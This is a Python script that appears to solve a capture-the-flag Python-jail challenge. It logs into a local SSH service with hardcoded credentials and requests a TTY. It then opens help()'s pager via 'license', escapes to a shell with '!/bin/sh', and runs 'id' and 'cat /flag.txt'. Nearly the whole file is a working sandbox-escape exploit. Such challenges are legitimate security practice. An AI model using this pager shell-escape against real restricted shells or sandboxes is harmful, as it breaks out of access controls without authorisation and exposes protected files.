#!/usr/bin/env python3
"""
Python Jail Escape Exploit Final
Uses paramiko with TTY allocation to exploit help() pager
"""

import paramiko
import time
import sys
import socket

HOST = "localhost"
PORT = 31337
USERNAME = "pcc"
PASSWORD = "pyjail"

def exploit():
    print(f"[*] Connecting to {HOST}:{PORT}...")
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD)
        
        # Invoke shell with TTY (crucial for pager)
        channel = client.invoke_shell(term='vt100', width=80, height=24)
        print("[+] Connected and shell invoked")
        
        # Helper to read output
        def read_until(expected, timeout=5):
            buffer = ""
            start = time.time()
            while time.time() - start < timeout:
                if channel.recv_ready():
                    data = channel.recv(1024).decode('utf-8', errors='ignore')
                    buffer += data
                    sys.stdout.write(data)
                    sys.stdout.flush()
                    if expected in buffer:
                        return True
                time.sleep(0.1)
            return False

        # Wait for jail prompt
        print("\n[*] Waiting for jail prompt...")
        if not read_until("$ "):
            print("[-] Could not find prompt")
            return

        # Send help()
        print("\n[*] Sending help()...")
        channel.send("help()\n")
        
        # Wait for help prompt
        print("\n[*] Waiting for help> prompt...")
        if not read_until("help>"):
            print("[-] Could not find help prompt")
            return

        # Send 'topics' to trigger pager (it's usually long enough)
        # Or 'modules' (takes longer but reliable)
        # Or just 'license'
        print("\n[*] Sending 'license' to trigger pager...")
        channel.send("license\n")
        
        # Wait a bit for pager to open
        time.sleep(2)
        
        # Send escape sequence
        print("\n[*] Sending shell escape sequence...")
        channel.send("!/bin/sh\n")
        time.sleep(1)
        
        # Check if we have a shell
        channel.send("id\n")
        time.sleep(1)
        
        # Read flag
        print("\n[*] Attempting to read flag...")
        channel.send("cat /flag.txt\n")
        
        # Read remaining output
        time.sleep(2)
        while channel.recv_ready():
            print(channel.recv(4096).decode('utf-8', errors='ignore'))
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    exploit()
